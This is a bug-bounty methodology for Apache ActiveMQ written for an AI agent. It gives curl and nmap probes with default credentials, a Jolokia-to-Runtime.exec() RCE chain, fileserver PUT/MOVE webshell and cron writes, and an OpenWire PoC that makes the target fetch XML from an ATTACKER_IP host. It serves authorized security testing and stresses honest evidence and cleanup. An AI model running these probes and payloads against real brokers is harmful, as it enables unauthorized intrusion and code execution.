---
technology: "Apache ActiveMQ"
kind: bug-bounty-methodology
audience: ai-agent
family: messaging
version: "1.1"
last-refresh: "2026-11-19"
source: "upstream-grounded: Apache security advisories (activemq.apache.org/components/classic/security index + per-CVE announcement texts), NVD, GHSA, vulhub reproduction writeups, distro trackers. Corpus contributed 1 genuine service detection; no usable usage patterns. v1.1 supplement: AI senior-reviewer pass (GPT-6.1 Sol via M365 Copilot, operator framing) + dual fact-check (agent-side direct fetches/searches of Apache announcement texts and reviewer-side web verification)."
provenance: "upstream-grounded: Apache security advisories (CVE-2023-46604, CVE-2016-3088), vulhub reproduction writeups, distro trackers. Corpus contributed 1 genuine service detection; no usable usage patterns. v1.1 supplement 2026-11-19 (model gpt-6.1-sol via M365 Copilot senior-review pass; claims dual-verified against activemq.apache.org announcement texts, the official Classic security-advisory index, NVD, GHSA): exact 46604 affected ranges replace the ≤5.18.2 shorthand; Jolokia/management-plane added as a first-class phase (CVE-2024-32114 unauthenticated API context 6.0.0–6.1.1; CVE-2026-34197 authenticated Jolokia RCE with the 5.19.4/5.19.5 source discrepancy recorded; CVE-2026-40466 bypass chain addNetworkConnector→VM transport→brokerConfig→ResourceXmlApplicationContext; CVE-2026-42588/45505/41044/49157/49877 default-Jolokia-authorization family); CVE-2015-5254 corrected to include broker-side paths; evidence-honesty fixes for the 46604 PoC (fetch ≠ execution proof); fileserver oracle soundness; jetty-realm.properties filename + credential-layer separation; MessageServlet default-off note (5.19.7/6.2.6); support-policy gates (5.18.x and 6.2.x unsupported); silent-failure-mode table."
---

# ActiveMQ bug bounty methodology

Target model: one JVM, two doors — web console on 8161, OpenWire on 61616 — plus optional AMQP/MQTT/STOMP listeners. Treat "one JVM, two doors" as a hypothesis to verify (proxies, containers, and split deployments break it). Authorization assumed; verify variants below are honest about what they prove.

Version gate (read first — the 2026 Jolokia family changed the target ranking):

| Advisory | Affected | Fixed | What it opens |
|---|---|---|---|
| CVE-2023-46604 (OpenWire RCE, CVSS 9.8) | Classic <5.15.16, 5.16.0–5.16.6, 5.17.0–5.17.5, 5.18.0–5.18.2; legacy OpenWire module from **5.8.0**; Java OpenWire **clients** too | 5.15.16/5.16.7/5.17.6/5.18.3 | Pre-auth broker (or client) RCE — Phase 3 |
| CVE-2024-32114 | Classic 6.0.0–6.1.1 default config | 6.1.2 | API context (Jolokia JMX REST **and** Message REST) unauthenticated by default |
| CVE-2026-34197 | Classic <5.19.4 (Apache) / <5.19.5 (GHSA — discrepancy recorded) and 6.x <6.2.3 | 5.19.4/5.19.5, 6.2.3 | Authenticated RCE via Jolokia MBeans |
| CVE-2026-40466 | <5.19.6, 6.0.0–<6.2.5 (needs activemq-http on classpath) | 5.19.6/6.2.5 | Bypass of 34197: `BrokerView.addNetworkConnector`/`addConnector` via Jolokia with HTTP Discovery transport → malicious endpoint returns a VM transport → `brokerConfig` loads remote Spring XML → `ResourceXmlApplicationContext` instantiates beans before validation → `Runtime.exec()` |
| CVE-2026-42588 / 45505 | <5.19.7, 6.x <6.2.6 | 5.19.7/6.2.6 | RCE via Jolokia `addNetworkConnector`; discovery-wrapper bypass of the earlier fix |
| CVE-2026-41044 | Jolokia-exposed DestinationView MBean | (advisory) | Authenticated user RCE via MBean |
| CVE-2026-49157 | <5.19.7, 6.0.0–<6.2.6 | 5.19.7/6.2.6 | Default `jolokia-access.xml` grants low-priv web accounts (`user` role) broker-management ops (addQueue, removeQueue, purge/move/send) |
| CVE-2026-49877 | web console defaults | (advisory) | Authenticated web users retain **admin** access by default in the console |
| CVE-2016-3088 (fileserver) | 5.0.0–5.13.x (default-open ≤5.11.x; disabled by default 5.12.0; **removed 5.14.0**) | — | Unauth file write — Phase 2 |

Support policy (upstream): Classic **5.18.x and older unsupported** (and 6.2.x now unsupported; supported: 6.4.x/6.3.x/5.19.x with dependency caveats) — an unpatched old branch is both more exposed and unfixable in place. Note CVE-2026-42253: MessageServlet was deprecated and **disabled by default** with 5.19.7/6.2.6 — the historical message-REST surface may not exist on current builds.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| OpenWire RCE (46604) | affected ranges above | yes | RCE as broker user (or client-side) — Critical |
| Jolokia family (32114/34197/40466/42588/45505/41044) | version + console/API reachability | 32114: yes (6.0.0–6.1.1 default); rest authenticated (default perms make `user` enough — 49157/49877) | Broker management → RCE on the broker JVM — Critical |
| Fileserver PUT+MOVE (3088) | 5.0.0–5.13.x, fileserver deployed+enabled | yes where enabled | Arbitrary file write → webshell RCE — Critical |
| Console default creds | unchanged jetty-realm.properties | credentialed | Console + (by default) Jolokia broker ops — High→Critical post-49157 |
| MQTT / STOMP / AMQP | per-connector authn + destination authz (separate!) | misconfig-dependent | Message stream read/publish — Medium |

## Phase 0 — Fingerprint and version oracle

```bash
nmap -p 8161,61616,5672,1883,61613,61614,8162 -sV 198.51.100.10
curl -si http://198.51.100.10:8161/admin/ | head -5
# 401 + WWW-Authenticate: Basic realm="ActiveMQRealm"  <- console confirmed
```

Version oracle — **status codes are weak oracles**: an auth challenge can fire before routing (even for nonexistent paths), and "disabled" ≠ "auth-protected". Compare each suspected route against a nonexistent-path control and record bodies/headers, not just codes.

```bash
curl -si -u admin:admin http://198.51.100.10:8161/admin/     # default pair; footer carries the version
for p in fileserver api webconsole hawtio api/jolokia; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" http://198.51.100.10:8161/$p/
done
```

- `/api/jolokia` present → the whole 2026 family applies (probe `/api/jolokia/version` — on 6.0.0–6.1.1 defaults it answers **unauthenticated**, CVE-2024-32114).
- `/fileserver` present → 5.0.0–5.13.x *era* — confirm deployment, not just a status code.
- Distinguish Classic from Artemis before applying any of this (`/console/auth/login` is Artemis). Artemis shipped the OpenWire code but no Spring gadget as of Apache's 3 Nov 2023 statement (dated qualification, not a timeless guarantee); the 46604 advisory still recommended Artemis 2.31.2 and upgrading Java OpenWire clients regardless of broker family.
- A console footer version cannot establish vendor-backport patch state — record evidence provenance.

## Phase 1 — Management plane: Jolokia and the console (the 2026 money phase)

Default authorization shape (verified from Apache advisories + shipped configs):
- Shipped `jetty.xml` maps the `user,admin` constraint across `/api/*` — a **`user`-role account reaches `/api/jolokia`**.
- Default `jolokia-access.xml` allows **every attribute and operation on `org.apache.activemq:*` MBeans** (no deny entries, no role distinction).

So any web login — including the default `user` account — is potentially broker-management and, on the versions below, broker-RCE:

```bash
# who am I / what does Jolokia expose
curl -si -u user:user http://198.51.100.10:8161/api/jolokia/version
# broker management as a low-priv user (CVE-2026-49157 band)
curl -si -u user:user -X POST http://198.51.100.10:8161/api/jolokia/ \
  -H 'Content-Type: application/json' \
  -d '{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addQueue","arguments":["apitest"]}'
```

Escalation to RCE on the broker JVM (authenticated; 34197 → 40466 → 42588/45505 chain, needs `activemq-http` on the classpath for the later links): Jolokia `exec` on `BrokerView.addNetworkConnector` with an HTTP Discovery transport under your control → your endpoint answers with a **VM transport** URI → the VM transport's `brokerConfig` parameter loads a remote Spring XML via `ResourceXmlApplicationContext`, which instantiates singleton beans *before* BrokerService validates the configuration → `Runtime.exec()` from bean factory methods. Each link is separately gated (module presence, version band) — verify the primitive at each step rather than assuming the chain.

Console-side recon after login: broker version, uptime, JVM, queues/topics with depth, subscribers, connection URLs. Queue browse (`queueBrowse` servlet/RSS views — discover the actual mapping for the release) leaks tokens/URLs/PII. Credential layers are separate: console web auth (`jetty-realm.properties`, singular — MD5-ish hashes when not plaintext), broker JAAS (`login.config`), and `credentials.properties` (a config-property source, not a Jetty realm) — inspect the actual representation before claiming "crackable hashes".

## Phase 2 — Fileserver unauthenticated file write (CVE-2016-3088)

Applies 5.0.0–5.13.x with the fileserver app deployed **and** enabled (default-open ≤5.11.x, disabled by default 5.12.0, removed 5.14.0). Mechanism: unauthenticated `PUT` into the fileserver store, then `MOVE` with a `file://` destination.

Evidence ladder (each step separate): upload accepted (any 2xx, not only 204) → content retrieved and matched (read back via the served store *before* moving it out) → out-of-store destination independently confirmed (the MOVE success response is weaker than confirming the destination file) → execution capability only on writable-executable paths. Cleanup: delete and verify removal. `/tmp` write alone is not "RCE" — report the demonstrated step.

```bash
curl -si -X PUT --data-binary 'marker-4660' http://198.51.100.10:8161/fileserver/4660test.txt
curl -si http://198.51.100.10:8161/fileserver/4660test.txt          # read-back BEFORE moving
curl -si -X MOVE -H "Destination: file:///tmp/marker-4660" \
  http://198.51.100.10:8161/fileserver/4660test.txt
# authorized full-test RCE variants: MOVE into webapps/admin/ as .jsp (then GET it),
# or /etc/cron.d|/var/spool/cron for scheduled execution
```

## Phase 3 — OpenWire pre-auth RCE (CVE-2023-46604)

Pre-auth, protocol-level: a manipulated OpenWire command names a class to instantiate with a String argument; the broker ships Spring, so `ClassPathXmlApplicationContext` with an attacker URL is the canonical gadget. Separate exploitation requirements (per Apache): network access, the manipulated command, a suitable classpath class.

Honesty about the "non-destructive" recipe: the staged XML with `ProcessBuilder` `init-method="start"` **executes a process on the target** when the context loads — it is *not* a no-execution check. And the HTTP fetch alone is not execution proof: the target can fetch the XML and fail before bean init.

```bash
# staging: your HTTP server logs the correlated fetch = evidence of the vulnerable
# constructor path (with version evidence, substantiates the CVE without demoing a shell)
# For a no-execution check, drop the ProcessBuilder bean entirely (empty <beans/>) —
# the fetch still proves the gadget class was invoked with your URL.
python3 -m http.server 8000
python3 activmq_poc.py -i 198.51.100.10 -p 61616 -u http://ATTACKER_IP:8000/poc.xml
```

Label evidence separately: "correlated resource retrieval via the vulnerable path" ≠ "OS command executed". No callback is *inconclusive* (egress filtering, routing, missing classes, malformed frames) — only corroborating rejection evidence turns it into a negative. Remember the advisory covers Java OpenWire **clients** too: a consuming app on an affected client version is the same RCE from the other side.

## Phase 4 — Secondary doors

- **MQTT (1883)**: broker security applies; connection acceptance ≠ destination authorization, and intended public access isn't automatically a vuln. Test connect, subscribe, publish separately per destination.
- **STOMP/AMQP credential reuse**: a hypothesis to test — realms *may* be shared; authn success ≠ destination rights.
- **KahaDB**: a write primitive does not imply a read primitive; journal disclosure needs its own reachable path and format validation.
- **ObjectMessage (CVE-2015-5254, ≤5.12.1)**: broker-side paths exist, not just consuming clients — web-console processing and STOMP object-message transformation. Browsing messages is not harmless on affected legacy systems. Fixed/recommended 5.13.0 with trusted-package configuration.

## Silent failure modes (technique dies quietly — check these first)

| Failure mode | Consequence |
|---|---|
| `≤5.18.2` shorthand used as the 46604 gate | Patched old-branch releases (5.15.16, 5.17.6) marked vulnerable — report rejected |
| Status-code oracles trusted (fileserver/console) | Auth-challenge-before-routing misread as deployment/version |
| Fetch callback claimed as execution proof | Overstated evidence; triage downgrades the report |
| `user`-role login treated as low value | 49157/49877 default Jolokia perms make it broker management or RCE |
| 6.x console checks applied to 5.x (or reverse) | Different defaults (32114 is 6.x-only) — wrong family, wasted testing |
| Artemis assumed exploitable (or safely excluded) by version alone | The no-gadget statement is dated Nov 2023; verify per advisory |
| MOVE into /tmp called RCE | Demonstrated step ≠ impact; finding undervalued or rejected |
| Backported distro read from footer version | Patch state wrong both ways |

## Reporting notes

Quote exact requests/responses per primitive; label demonstrated capability vs inferred impact separately (fetch ≠ exec; write ≠ RCE). Severity anchors: 46604 = 9.8; the Jolokia family = 8.8-class authenticated RCE; low-priv→admin-by-default (49157) = 8.8. Remediation line: current supported release (6.4.x/6.3.x/5.19.x per Apache policy), fileserver removed, Jolokia authorization restricted, default credentials changed, MessageServlet disabled. Cleanup: delete markers, remove staged XML, remove created queues/connectors.

## Appendix A — Tool map

nmap (listener map); curl (console/Jolokia/fileserver probes — everything is HTTP); public OpenWire PoC senders (verify the gadget class is ClassPathXmlApplicationContext); mosquitto-clients (MQTT authn/authz probes); hashcat for realm hashes where actually hashed; jq.

## Appendix B — Quick reference

```bash
nmap -p 8161,61616,5672,1883,61613 -sV 198.51.100.10
curl -si http://198.51.100.10:8161/admin/                                   # realm
curl -si -u admin:admin http://198.51.100.10:8161/admin/                    # defaults + version
curl -si http://198.51.100.10:8161/api/jolokia/version                      # 32114: unauth on 6.0.0-6.1.1
curl -si -u user:user http://198.51.100.10:8161/api/jolokia/version         # 49157: user role reaches it
curl -si -X PUT --data-binary x http://198.51.100.10:8161/fileserver/t.txt  # 3088 write
python3 activmq_poc.py -i 198.51.100.10 -p 61616 -u http://ATTACKER_IP:8000/poc.xml  # 46604
```

## References (v1.1 verification trail)

- activemq.apache.org/components/classic/security (full advisory index — the 2026 series listed verbatim) + per-CVE announcement texts: CVE-2026-40466 (full chain description), CVE-2026-49157 (default Jolokia authorization), CVE-2026-34197 (5.19.4/6.2.3; GHSA records 5.19.5 — discrepancy preserved).
- NVD CVE-2024-32114 ("6.x default configuration doesn't secure the API web context — Jolokia JMX REST API and Message REST API... without any required authentication", fixed 6.1.2), CVE-2023-46604 affected-product data (legacy module 5.8.0 lower bound; clients).
- Apache 3 Nov 2023 Artemis explanation (no Spring gadget as dated; Artemis 2.31.2; client upgrades).
- Apache repo security policy (5.18.x and older unsupported; 6.2.x unsupported; supported 6.4.x/6.3.x/5.19.x).
- CVE-2015-5254 advisory (broker-side web-console + STOMP transformation paths; 5.13.0 + trusted packages).
